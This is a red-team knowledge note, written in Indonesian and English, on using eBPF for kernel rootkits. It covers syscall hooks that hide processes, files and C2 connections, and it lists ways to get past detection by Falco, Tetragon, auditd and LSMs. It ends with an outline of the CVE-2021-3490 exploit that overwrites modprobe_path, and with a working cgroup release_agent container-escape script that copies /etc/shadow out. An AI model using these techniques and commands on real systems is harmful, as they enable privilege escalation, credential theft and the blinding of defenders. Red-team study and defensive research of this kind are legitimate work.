---
title: Attack Perspective — eBPF Kernel Security (Red Team Rootkit)
tags:
- attack
- red-team
- ebpf
- kernel
- rootkit
- verifier
- bypass
- stealth
created: 2026-08-14
updated: 2026-08-14
status: complete
cssclasses:
  - wide-table
  
---

# eBPF Kernel Security — Perspektif Penyerang (Rootkit)

> eBPF = kernel program yang load tanpa module — perfect untuk rootkit stealth. Red team pakai: syscall hook, process/file/port hiding, EDR bypass, privilege escalation via verifier bug.

## 1. Attack Surface eBPF

| Komponen | Vektor | MITRE ID | Teknik | Evasion | Detection Gap |
|----------|--------|----------|--------|---------|----------------|
| **Verifier** | Verifier bypass → arbitrary kernel write | T1068 | CVE-2021-3490 (verifier UAF), CVE-2022-0185 | Kernel code exec via eBPF | Verifier = static analysis → bypass = dynamic |
| **kprobe** | Hook kernel function → intercept syscall | T1055.012 | kprobe → read/modify argument | Kernel-level = below EDR | EDR kernel callback → tapi eBPF hook = shadow |
| **tracepoint** | Hook tracepoint → intercept event | T1055.012 | tracepoint → filter/modify | Same as above | Same as above |
| **syscall hook** | Intercept syscall → return modified result | T1055.012 | getdents hook → hide file | ps/ls/netstat = filtered output | EDR = sees "clean" system |
| **cgroup hook** | Network filter at cgroup level | T1055.012 | cgroup egress → block exfil detect | Traffic filter = legit cgroup | Monitoring = below cgroup |
| **XDP** | Driver-level packet filter | T1055.012 | XDP → drop monitoring packet | Below kernel stack = no sysmon | EDR = blind to XDP |

## 2. eBPF Rootkit Chain

```
Prereq: Root access (kernel exploit, container escape, compromised service)
    ↓
Load eBPF Program:
  ├── Compile BPF C → object → bpf() syscall → kernel
  ├── Attach ke kprobe/tracepoint/syscall
  └→ JIT compile → run di kernel context
    ↓
Syscall Interception:
  ├── getdents64 → hide file/directory
  ├── kill → hide process (ps, top)
  ├── connect → hide network connection (ss, netstat)
  ├── read → filter credential/keylog output
  └→ openat → hide payload file
    ↓
Result:
  ├── ps → no attacker process
  ├── ls → no payload file
  ├── netstat/ss → no C2 connection
  └→ EDR → "sistem bersih" (semua telemetry di-filter)
    ↓
Persistence: eBPF program di-pin (bpffs) → survive reboot
    ↓
Alternative — Kernel Exploit via eBPF:
  ├── CVE-2021-3490 → verifier bypass → kernel write → root
  ├── CVE-2022-0185 → heap overflow → kernel RCE
  └→ No module load → no lsmod trace
```

## 3. Detection & Bypass

| Defender Detection | Red Team Bypass |
|---------------------|-----------------|
| bpftool prog list | Hook bpftool syscall → filter output |
| eBPF signature (bpf() syscall monitor) | Legit eBPF program name (obfuscated) |
| Falco/Tetragon (eBPF-based detect) | Load BEFORE Falco → hook Falco's eBPF source |
| Kernel module check (lsmod) | eBPF ≠ module → no lsmod entry |
| LSM (landlock/apparmor) | eBPF hook di bawah LSM → bypass |
| Audit log (auditd) | Hook audit syscall → filter event |

## 4. Tool Stack

| Tool | Use |
|------|-----|
| **libbpf** | BPF program compile/load (standard) |
| **bcc** | BPF scripting (Python — execsnoop, opensnoop as base) |
| **bpftrace** | BPF one-liner (attach → log → modify) |
| **CVE-2021-3490 exploit** | Verifier bypass → kernel write |
| **Falco / Tetragon** | Detection target — reverse engineer bypass |

## 5. Referensi
- eBPF Project — https://ebpf.io/
- CVE-2021-3490 — https://nvd.nist.gov/vuln/detail/CVE-2021-3490
- CVE-2022-0185 — https://nvd.nist.gov/vuln/detail/CVE-2022-0185
- eBPF Rootkit Research — https://www.ebpf.top/...
- libbpf — https://libbpf.readthedocs.io/


## Konkret — eBPF Exploit Payload (Testable)

### Verifier Bypass — CVE-2021-3490 (Privesc)

```c
// eBPF verifier type confusion → arbitrary kernel read/write
// Path: penggunaan ulang pointer map value setelah out-of-bounds add

// Prasyarat: unprivileged BPF aktif (kernel.unprivileged_bpf_disabled=0)
// Alur: verifier bypass → overwrite modprobe_path → root

1. Load BPF map (array of 0x1000 elemen)
2. Program:
   - lookup elem → ptr value
   - add offset besar (melewati bound) → ptr jadi out-of-bounds
   - bpf_skb_load_bytes → tulis ke kernel memori
3. Target: modprobe_path (0xffffffff81e3ea80, cari via /proc/kallsyms)
4. Overwrite /sbin/modprobe → /tmp/x → trigger modprobe via file aneh
5. /tmp/x = script yang tulis /root/root.txt
```

### CVE-2022-0185 — Heap Overflow (fs_context)

```bash
# unshare user namespace dulu (map uid/gid)
unshare -Ur

# Trigger legacy_parse_param overflow via filesystem context
# PoC: https://github.com/Crusaders-of-Rust/CVE-2022-0185

# Hasil: heap overflow pada legacy_parse_param
# → corrupt msg_msg / pipe_buffer
# → arbitrary free → RCE di context user namespace

# Alternatif cepat privesc container:
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo \"$host_path/cmd\" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo 'cat /etc/shadow > /tmp/pwned' >> /cmd
chmod +x /cmd
sh -c 'echo \$\$ > /tmp/cgrp/x/cgroup.procs'
```
---

audited
---
